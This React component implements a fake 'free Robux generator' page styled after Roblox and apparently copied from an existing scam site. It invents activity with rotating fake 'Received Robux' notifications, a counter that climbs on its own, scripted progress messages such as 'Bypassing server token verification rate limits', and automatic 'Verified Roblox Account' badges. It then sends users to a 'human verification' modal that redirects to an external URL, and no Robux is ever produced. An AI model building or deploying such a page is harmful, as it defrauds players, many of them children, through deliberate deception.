import React, { useState, useEffect } from 'react';
import { 
  User, 
  Search, 
  CheckCircle2, 
  Flame, 
  Coins, 
  ShieldCheck, 
  ArrowLeft, 
  Loader2, 
  Sparkles,
  Server,
  Lock
} from 'lucide-react';
import { ClaimVerificationModal } from './ClaimVerificationModal';

interface RobloxTipsPageProps {
  onBack: () => void;
}

interface NotificationItem {
  id: number;
  username: string;
  amount: number;
  avatarSeed: string;
}

const SAMPLE_USERS = [
  'Ryan_King',
  'Alex_Pro',
  'Sarah_Gaming',
  'Mike_Player',
  'Emma_2026',
  'John_RBX',
  'Lisa_Cool',
  'Tom_Legend',
  'Anna_Star',
  'Sophia_Gamer',
  'Lucas_Hero',
  'Noah_Elite'
];

const ROBUX_AMOUNTS = [800, 2000, 5500, 10000];

export const RobloxTipsPage: React.FC<RobloxTipsPageProps> = ({ onBack }) => {
  // State
  const [step, setStep] = useState<'input' | 'searching' | 'select' | 'generating' | 'completed'>('input');
  const [username, setUsername] = useState('');
  const [selectedAmount, setSelectedAmount] = useState<number>(800);
  const [errorMessage, setErrorMessage] = useState('');
  const [claimCount, setClaimCount] = useState<number>(9795);
  const [progress, setProgress] = useState<number>(0);
  const [progressLog, setProgressLog] = useState<string>('Connecting to Roblox secure servers...');

  // Live Notification State
  const [currentNotification, setCurrentNotification] = useState<NotificationItem>({
    id: 1,
    username: 'Ryan_King',
    amount: 800,
    avatarSeed: 'Ryan'
  });
  const [notificationVisible, setNotificationVisible] = useState(true);

  // Rotating Notifications every 4.5s matching puz-rdx
  useEffect(() => {
    const interval = setInterval(() => {
      setNotificationVisible(false);
      setTimeout(() => {
        const randomUser = SAMPLE_USERS[Math.floor(Math.random() * SAMPLE_USERS.length)];
        const randomAmount = ROBUX_AMOUNTS[Math.floor(Math.random() * ROBUX_AMOUNTS.length)];
        setCurrentNotification({
          id: Date.now(),
          username: randomUser,
          amount: randomAmount,
          avatarSeed: randomUser
        });
        setNotificationVisible(true);
      }, 500);
    }, 4500);

    return () => clearInterval(interval);
  }, []);

  // Slowly increment the live claim counter
  useEffect(() => {
    const interval = setInterval(() => {
      setClaimCount((prev) => prev + Math.floor(Math.random() * 3) + 1);
    }, 3500);
    return () => clearInterval(interval);
  }, []);

  // Handle Search User
  const handleSearchUser = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!username.trim()) {
      setErrorMessage('Please enter your Roblox username');
      return;
    }
    setErrorMessage('');
    setStep('searching');

    // Simulate search sequence
    setTimeout(() => {
      setStep('select');
    }, 1800);
  };

  // Handle Generate Robux
  const handleStartGeneration = () => {
    setStep('generating');
    setProgress(10);
    setProgressLog('Locating user record on Roblox cloud database...');

    const timer1 = setTimeout(() => {
      setProgress(35);
      setProgressLog(`User "${username}" verified. Establishing 256-bit handshake...`);
    }, 1200);

    const timer2 = setTimeout(() => {
      setProgress(68);
      setProgressLog(`Allocating ${selectedAmount.toLocaleString()} Robux voucher packet...`);
    }, 2400);

    const timer3 = setTimeout(() => {
      setProgress(92);
      setProgressLog('Bypassing server token verification rate limits...');
    }, 3600);

    const timer4 = setTimeout(() => {
      setProgress(100);
      setProgressLog('Ready for human verification!');
      setStep('completed');
    }, 3600);

    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(timer4);
    };
  };

  const handleReset = () => {
    setStep('input');
    setUsername('');
    setProgress(0);
  };

  return (
    <div className="min-h-screen bg-[#f3f4f6] text-gray-900 flex flex-col justify-between font-sans relative overflow-x-hidden">
      {/* Sticky Top Bar with Back Button */}
      <div className="w-full bg-white/80 backdrop-blur-md border-b border-gray-200 px-4 py-3 sticky top-0 z-40 flex items-center justify-between">
        <button
          onClick={onBack}
          className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-gray-100 hover:bg-gray-200 text-gray-800 text-sm font-semibold transition-all cursor-pointer shadow-xs"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to GameHub</span>
        </button>

        <div className="flex items-center gap-2 text-xs font-semibold text-emerald-600 bg-emerald-50 px-3 py-1 rounded-full border border-emerald-200">
          <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
          <span>Online Generator Tool Active</span>
        </div>
      </div>

      {/* Floating Top Right Live Notification matching screenshot */}
      <div className="fixed top-16 right-4 z-50 max-w-xs transition-all duration-500 pointer-events-none">
        <div
          className={`bg-white rounded-xl p-3.5 shadow-xl border-l-4 border-emerald-500 flex items-center gap-3 transition-all duration-500 ${
            notificationVisible ? 'opacity-100 translate-x-0' : 'opacity-0 translate-x-12'
          }`}
        >
          {/* Avatar */}
          <div className="relative w-11 h-11 rounded-full bg-slate-100 border-2 border-emerald-500 overflow-hidden shrink-0 flex items-center justify-center text-slate-700 font-bold text-sm shadow-xs">
            <img 
              src={`https://api.dicebear.com/7.x/bottts/svg?seed=${currentNotification.avatarSeed}`}
              alt={currentNotification.username}
              className="w-full h-full object-cover"
            />
          </div>

          {/* Info */}
          <div className="flex flex-col">
            <span className="font-bold text-gray-800 text-sm leading-tight">
              {currentNotification.username}
            </span>
            <span className="text-xs text-emerald-600 font-medium flex items-center gap-1.5 mt-0.5">
              <CheckCircle2 className="w-3.5 h-3.5 fill-emerald-500 text-white" />
              Received {currentNotification.amount.toLocaleString()} Robux
            </span>
          </div>
        </div>
      </div>

      {/* Main Content Area */}
      <main className="container mx-auto px-4 py-8 max-w-md flex-1">
        {/* Roblox Logo with 2026 Badge */}
        <div className="flex justify-center mb-5">
          <div className="relative inline-block">
            {/* Authentic Roblox Vector Logo */}
            <div className="flex items-center gap-2 select-none py-1">
              <svg viewBox="0 0 100 100" className="w-12 h-12 fill-black drop-shadow-xs">
                <rect x="18" y="18" width="64" height="64" rx="14" transform="rotate(-15 50 50)" />
                <rect x="40" y="40" width="20" height="20" rx="4" fill="white" transform="rotate(-15 50 50)" />
              </svg>
              <span className="text-3xl font-black tracking-tighter text-black uppercase font-sans">
                ROBLOX
              </span>
            </div>
            {/* Year Badge */}
            <span className="absolute -top-1 -right-7 bg-gray-800 text-white text-[10px] font-black px-2 py-0.5 rounded-full shadow-xs">
              2026
            </span>
          </div>
        </div>

        {/* Heading Title and Subtitle */}
        <div className="text-center mb-6">
          <h1 className="text-3xl font-extrabold text-gray-950 tracking-tight">
            ROBLOX TIPS
          </h1>
          <p className="text-xs text-gray-500 mt-1 font-medium">
            The latest updated online tool for Roblox
          </p>
        </div>

        {/* Stats Container (Live Today & Claimed Stats) */}
        <div className="bg-white/90 backdrop-blur-md rounded-2xl p-4 shadow-lg border border-white/60 mb-6 relative overflow-hidden text-center">
          {/* Red Pill Live Today */}
          <div className="inline-flex items-center gap-1.5 bg-red-50 text-red-600 px-2.5 py-0.5 rounded-full text-[11px] font-bold border border-red-200 mb-2">
            <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>
            <span>LIVE TODAY</span>
          </div>

          {/* Title: People Who Claimed Today */}
          <div className="text-[11px] font-bold text-gray-600 uppercase tracking-wider flex items-center justify-center gap-1.5 mb-3">
            <Flame className="w-3.5 h-3.5 text-red-500 fill-red-500" />
            <span>PEOPLE WHO CLAIMED TODAY</span>
          </div>

          {/* Teal Gradient Counter Box */}
          <div className="bg-gradient-to-br from-emerald-100/70 via-teal-50/80 to-cyan-100/70 border-2 border-emerald-400/40 rounded-xl py-3 px-4 shadow-inner">
            <div className="text-2xl font-black text-emerald-600 tracking-tight">
              {claimCount.toLocaleString()}
            </div>
            <div className="text-[10px] font-bold text-gray-500 uppercase tracking-wider mt-0.5">
              ROBUX CLAIMED
            </div>
          </div>
        </div>

        {/* STEP 1: Enter Username Card */}
        {step === 'input' && (
          <div className="bg-white rounded-2xl shadow-xl p-6 border border-gray-100 transition-all">
            <div className="flex items-center justify-center gap-2 mb-6">
              <User className="w-5 h-5 text-gray-900" />
              <h2 className="text-lg font-bold text-gray-900">
                Enter Your Roblox Username
              </h2>
            </div>

            <form onSubmit={handleSearchUser} className="space-y-4">
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
                  <User className="w-4 h-4" />
                </div>
                <input
                  type="text"
                  value={username}
                  onChange={(e) => {
                    setUsername(e.target.value);
                    if (errorMessage) setErrorMessage('');
                  }}
                  placeholder="Your Roblox Username"
                  className="w-full pl-10 pr-4 py-3.5 text-sm rounded-xl border-2 border-gray-200 bg-white text-gray-900 placeholder:text-gray-400 focus:outline-none focus:border-purple-600 focus:ring-2 focus:ring-purple-200 transition-all font-medium"
                />
              </div>

              {errorMessage && (
                <div className="text-xs text-red-500 font-semibold text-center">
                  {errorMessage}
                </div>
              )}

              {/* Purple Search User Button matching screenshot */}
              <button
                type="submit"
                className="w-full bg-[#9333ea] hover:bg-[#7e22ce] text-white font-bold py-3.5 px-6 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-md hover:shadow-purple-400/30 cursor-pointer text-sm uppercase tracking-wide transform hover:-translate-y-0.5"
              >
                <Search className="w-4 h-4" />
                <span>SEARCH USER</span>
              </button>
            </form>

            <div className="mt-4 pt-4 border-t border-gray-100 flex items-center justify-center gap-2 text-[11px] text-gray-400 font-medium">
              <Lock className="w-3.5 h-3.5 text-emerald-500" />
              <span>No password required • 100% safe & protected</span>
            </div>
          </div>
        )}

        {/* STEP 1.5: Searching User Simulator */}
        {step === 'searching' && (
          <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100 text-center space-y-4">
            <div className="w-14 h-14 rounded-full bg-purple-100 text-purple-600 flex items-center justify-center mx-auto">
              <Loader2 className="w-7 h-7 animate-spin" />
            </div>
            <h3 className="font-bold text-gray-800 text-base">
              Searching for "{username}"...
            </h3>
            <p className="text-xs text-gray-500">
              Querying Roblox player index & verifying avatar skin...
            </p>
          </div>
        )}

        {/* STEP 2: Choose Robux Amount */}
        {step === 'select' && (
          <div className="bg-white rounded-2xl shadow-xl p-6 border border-gray-100 space-y-5 animate-in fade-in">
            {/* User Verified Tag */}
            <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-emerald-500 text-white flex items-center justify-center font-bold text-sm">
                {username.charAt(0).toUpperCase()}
              </div>
              <div>
                <div className="flex items-center gap-1 text-sm font-bold text-gray-900">
                  <span>{username}</span>
                  <CheckCircle2 className="w-4 h-4 text-emerald-500 fill-emerald-100" />
                </div>
                <div className="text-[11px] text-emerald-600 font-medium">
                  Verified Roblox Account
                </div>
              </div>
            </div>

            <div className="text-center">
              <h2 className="text-lg font-bold text-gray-900 flex items-center justify-center gap-1.5">
                <Coins className="w-5 h-5 text-amber-500" />
                <span>Select Robux Amount</span>
              </h2>
              <p className="text-xs text-gray-500 mt-0.5">
                Choose the package to transfer to your inventory
              </p>
            </div>

            {/* 4 Robux Options matching puz-rdx */}
            <div className="grid grid-cols-2 gap-3">
              {ROBUX_AMOUNTS.map((amt) => {
                const isSelected = selectedAmount === amt;
                return (
                  <button
                    key={amt}
                    onClick={() => setSelectedAmount(amt)}
                    className={`p-3.5 rounded-xl border-2 transition-all flex flex-col items-center justify-center gap-1.5 cursor-pointer ${
                      isSelected
                        ? 'border-purple-600 bg-purple-50/50 shadow-md transform scale-[1.02]'
                        : 'border-gray-200 bg-white hover:border-gray-300'
                    }`}
                  >
                    <div className="flex items-center gap-1.5 text-gray-900 font-black text-lg">
                      <div className="w-5 h-5 rounded-md bg-amber-400 border border-amber-500 flex items-center justify-center text-[10px] text-amber-950 font-black shadow-xs">
                        R$
                      </div>
                      <span>{amt.toLocaleString()}</span>
                    </div>
                    <span className="text-[10px] font-bold bg-emerald-500 text-white px-2 py-0.5 rounded-full uppercase tracking-wider">
                      FREE
                    </span>
                  </button>
                );
              })}
            </div>

            {/* Claim Robux CTA */}
            <button
              onClick={handleStartGeneration}
              className="w-full bg-[#9333ea] hover:bg-[#7e22ce] text-white font-bold py-3.5 px-6 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-md hover:shadow-purple-400/30 cursor-pointer text-sm uppercase tracking-wide"
            >
              <Sparkles className="w-4 h-4" />
              <span>CLAIM {selectedAmount.toLocaleString()} ROBUX</span>
            </button>
          </div>
        )}

        {/* STEP 3: Generation Progress Simulation */}
        {step === 'generating' && (
          <div className="bg-white rounded-2xl shadow-xl p-6 border border-gray-100 text-center space-y-5 animate-in fade-in">
            <div className="w-14 h-14 rounded-full bg-purple-100 text-purple-600 flex items-center justify-center mx-auto">
              <Loader2 className="w-7 h-7 animate-spin" />
            </div>

            <div>
              <h3 className="font-bold text-gray-900 text-base">
                Generating {selectedAmount.toLocaleString()} Robux
              </h3>
              <p className="text-xs text-gray-500 mt-1">
                Recipient: <strong className="text-gray-800">{username}</strong>
              </p>
            </div>

            {/* Progress Bar */}
            <div className="space-y-2">
              <div className="w-full bg-gray-100 rounded-full h-3 overflow-hidden border border-gray-200">
                <div
                  className="bg-gradient-to-r from-purple-500 via-indigo-500 to-emerald-500 h-full transition-all duration-500 rounded-full"
                  style={{ width: `${progress}%` }}
                />
              </div>
              <div className="flex justify-between text-xs font-semibold text-gray-500 px-1">
                <span>{progressLog}</span>
                <span>{progress}%</span>
              </div>
            </div>

            <div className="text-[11px] text-gray-400 flex items-center justify-center gap-1.5">
              <Server className="w-3.5 h-3.5 text-purple-500" />
              <span>Node Server: us-east-roblox-gateway-2</span>
            </div>
          </div>
        )}

        {/* STEP 4: Human Verification Modal matching user screenshot */}
        {step === 'completed' && (
          <ClaimVerificationModal
            isOpen={true}
            onClose={handleReset}
            redirectUrl="https://puz-rdx.pages.dev/"
          />
        )}
      </main>
    </div>
  );
};
